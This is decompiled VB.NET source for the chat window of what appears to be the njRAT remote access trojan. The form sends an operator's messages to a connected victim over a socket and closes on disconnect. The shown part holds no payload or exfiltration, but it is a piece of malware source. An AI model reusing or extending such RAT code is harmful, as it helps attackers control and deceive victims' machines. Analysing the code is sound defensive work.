Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200000E RID: 14
	<DesignerGenerated()>
	Public Partial Class Chat
		Inherits Form

		' Token: 0x1700005D RID: 93
		' (get) Token: 0x060000D9 RID: 217 RVA: 0x00008AAA File Offset: 0x00006CAA
		' (set) Token: 0x060000DA RID: 218 RVA: 0x00008AB4 File Offset: 0x00006CB4
		Friend Overridable Property Panel1 As Panel

		' Token: 0x1700005E RID: 94
		' (get) Token: 0x060000DB RID: 219 RVA: 0x00008ABD File Offset: 0x00006CBD
		' (set) Token: 0x060000DC RID: 220 RVA: 0x00008AC8 File Offset: 0x00006CC8
		Friend Overridable Property T1 As RichTextBox
			<CompilerGenerated()>
			Get
				Return Me._T1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RichTextBox)
				Dim value2 As LinkClickedEventHandler = AddressOf Me.T1_LinkClicked
				Dim t As RichTextBox = Me._T1
				If t IsNot Nothing Then
					RemoveHandler t.LinkClicked, value2
				End If
				Me._T1 = value
				t = Me._T1
				If t IsNot Nothing Then
					AddHandler t.LinkClicked, value2
				End If
			End Set
		End Property

		' Token: 0x1700005F RID: 95
		' (get) Token: 0x060000DD RID: 221 RVA: 0x00008B0B File Offset: 0x00006D0B
		' (set) Token: 0x060000DE RID: 222 RVA: 0x00008B18 File Offset: 0x00006D18
		Friend Overridable Property T2 As TextBox
			<CompilerGenerated()>
			Get
				Return Me._T2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As KeyEventHandler = AddressOf Me.T2_KeyDown
				Dim t As TextBox = Me._T2
				If t IsNot Nothing Then
					RemoveHandler t.KeyDown, value2
				End If
				Me._T2 = value
				t = Me._T2
				If t IsNot Nothing Then
					AddHandler t.KeyDown, value2
				End If
			End Set
		End Property

		' Token: 0x17000060 RID: 96
		' (get) Token: 0x060000DF RID: 223 RVA: 0x00008B5B File Offset: 0x00006D5B
		' (set) Token: 0x060000E0 RID: 224 RVA: 0x00008B68 File Offset: 0x00006D68
		Friend Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000061 RID: 97
		' (get) Token: 0x060000E1 RID: 225 RVA: 0x00008BAB File Offset: 0x00006DAB
		' (set) Token: 0x060000E2 RID: 226 RVA: 0x00008BB8 File Offset: 0x00006DB8
		Friend Overridable Property vmethod_8 As Timer
			<CompilerGenerated()>
			Get
				Return Me._vmethod_8
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim vmethod_ As Timer = Me._vmethod_8
				If vmethod_ IsNot Nothing Then
					RemoveHandler vmethod_.Tick, value2
				End If
				Me._vmethod_8 = value
				vmethod_ = Me._vmethod_8
				If vmethod_ IsNot Nothing Then
					AddHandler vmethod_.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x060000E3 RID: 227 RVA: 0x00008BFC File Offset: 0x00006DFC
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Chat_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Chat_Load
			Me.hk = "!~Hacker~!"
			Me.InitializeComponent()
		End Sub

		' Token: 0x060000E4 RID: 228 RVA: 0x00008C4C File Offset: 0x00006E4C
		Private Sub Chat_FormClosing(sender As Object, e As FormClosingEventArgs)
			Dim cn As Boolean = Me.sk.CN
			If cn Then
				Me.sk.Send("@")
			End If
			Me.sk.CN = False
		End Sub

		' Token: 0x060000E5 RID: 229 RVA: 0x00008C88 File Offset: 0x00006E88
		Private Sub Chat_Load(sender As Object, e As EventArgs)
			Me.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
			MyBase.Show()
			Dim left As String = Interaction.InputBox("Enter Your NickName", "Chat", Me.hk, -1, -1)
			Dim flag As Boolean = Operators.CompareString(left, String.Empty, False) = 0
			If flag Then
				Me.sk.CN = False
			Else
				Me.hk = left
				Me.sk.Send("~" + Class7.string_1 + Class6.smethod_14(Me.hk))
			End If
			Me.vmethod_8.Enabled = True
			Me.T2.[Select]()
			Me.T2.Focus()
		End Sub

		' Token: 0x060000E6 RID: 230 RVA: 0x00008D4C File Offset: 0x00006F4C
		Private Sub T2_KeyDown(sender As Object, e As KeyEventArgs)
			Dim flag As Boolean = e.KeyCode = Keys.[Return]
			If flag Then
				e.SuppressKeyPress = True
				Dim flag2 As Boolean = Operators.CompareString(Me.T2.Text, String.Empty, False) <> 0
				If flag2 Then
					SyncLock Me
						Me.T1.SelectionStart = Me.T1.TextLength
						Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
						Me.T1.AppendText("[" + Me.hk + "] ")
						Me.T1.SelectionFont = Me.T1.Font
						Me.T1.AppendText(Me.T2.Text + vbCrLf)
						Me.T1.SelectionStart = Me.T1.TextLength
						Me.T1.ScrollToCaret()
						Dim t As TextBox = Me.T2
						Dim text As String = t.Text
						t.Text = text
						Me.sk.Send("!" + Class7.string_1 + Class6.smethod_14(text))
						Me.T2.Text = String.Empty
					End SyncLock
				End If
			Else
				Me.T2.[Select]()
			End If
		End Sub

		' Token: 0x060000E7 RID: 231 RVA: 0x00008ED8 File Offset: 0x000070D8
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.T2.Text, String.Empty, False) <> 0
			If flag Then
				SyncLock Me
					Me.T1.SelectionStart = Me.T1.TextLength
					Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
					Me.T1.AppendText("[" + Me.hk + "] ")
					Me.T1.SelectionFont = Me.T1.Font
					Me.T1.AppendText(Me.T2.Text + vbCrLf)
					Me.T1.SelectionStart = Me.T1.TextLength
					Me.T1.ScrollToCaret()
					Dim t As TextBox = Me.T2
					Dim text As String = t.Text
					t.Text = text
					Me.sk.Send("!" + Class7.string_1 + Class6.smethod_14(text))
					Me.T2.Text = String.Empty
				End SyncLock
			End If
		End Sub

		' Token: 0x060000E8 RID: 232 RVA: 0x0000902C File Offset: 0x0000722C
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.sk Is Nothing Or Me.osk Is Nothing
			If flag Then
				Dim flag2 As Boolean = Me.T2.Enabled Or Operators.CompareString(Me.T1.Text, String.Empty, False) = 0
				If flag2 Then
					Me.T1.AppendText("Disconnected ...")
				End If
				Me.T2.Enabled = False
				Me.Button1.Enabled = False
				Me.sk.Send("@")
				Me.sk.CN = False
				MyBase.Close()
			Else
				Dim flag3 As Boolean = Not Me.sk.CN Or Not Me.osk.CN
				If flag3 Then
					Dim flag4 As Boolean = Me.T2.Enabled Or Operators.CompareString(Me.T1.Text, String.Empty, False) = 0
					If flag4 Then
						Me.T1.AppendText("Disconnected ...")
					End If
					Me.T2.Enabled = False
					Me.Button1.Enabled = False
					Me.sk.Send("@")
					Me.sk.CN = False
					MyBase.Close()
				End If
			End If
		End Sub

		' Token: 0x060000E9 RID: 233 RVA: 0x00009170 File Offset: 0x00007370
		Private Sub T1_LinkClicked(sender As Object, e As LinkClickedEventArgs)
			Try
				Process.Start(e.LinkText)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x04000068 RID: 104
		Public hk As String

		' Token: 0x04000069 RID: 105
		Public osk As Client

		' Token: 0x0400006A RID: 106
		Public sk As Client
	End Class
End Namespace
